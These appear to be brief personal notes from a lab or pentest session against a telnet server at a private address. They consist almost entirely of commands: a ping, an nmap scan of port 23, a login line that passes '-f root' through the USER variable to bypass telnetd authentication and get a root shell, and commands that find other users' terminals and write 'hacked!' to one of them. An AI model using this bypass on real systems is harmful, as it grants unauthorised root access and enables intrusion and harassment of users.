## Telnet issue
```bash
ping 192.168.1.251
```

```bash
USER='-f root' telnet -a 192.168.1.251
```

```bash
nmap -sV -p 23 192.168.1.251
```
[[nmap]]

## Terminal
to see terminal
```bash
tty
```
```bash
ps -eo user,tty | grep -v \? | sort -u
```
```bash
watch -n 1 "ps -eo user,tty | grep -v \? | sort -u"
```
```bash
echo hacked! > /dev/pts/1
```